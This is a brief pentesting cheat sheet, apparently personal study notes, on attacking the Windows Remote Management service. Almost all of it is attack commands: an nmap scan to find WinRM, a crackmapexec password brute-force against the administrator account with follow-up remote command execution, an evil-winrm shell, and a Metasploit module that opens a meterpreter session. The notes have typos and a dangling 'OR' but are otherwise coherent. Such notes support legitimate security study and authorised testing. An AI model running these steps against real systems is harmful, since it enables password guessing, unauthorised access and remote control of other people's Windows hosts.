# Windows Remote Management Protocol
* A protocol that can be used :
    * Remotely access and interact with Windows hosts on a local network.
    * Can be used to facilitiate remote access with Windows systems over HTTP(S)
    * Typically uses port 5985 and 5986 (HTTPS)
 
## Exploit WinRM

* Step 1: Check whether WinRM is running on the target system
    * `nmap -sV -p 5985 [IP]  OR
* **Brute-force attack**
    * ### crackmapexec
        * `crackmapexec winrm [IP] -u [Username, can go with "administrator" accountas it must be there on any Windows system] -p [Password list]`
        * Then use the password fetched from the previous step to run a command
            * `crackmapexec winrm [IP] -u [Username] -p [password] -x "[command, like "whoami"]"`
         
        
    * ### Ruby script: evil-winrm
      * * **Obtain a command shell**
              *  `evil-winrm.rb -u [username] -p [password] -i [IP]`

    * ### Start a meterpreter session with msfconsole
        * `service postgresql start && msfconsole`
        * `use windows/winrm/winrm_script_exec`
        * `set rhosts, password, username and FORCE_VBS to true`  --> Force_vbs when set true forces the module to use the Visual Basics command stager.
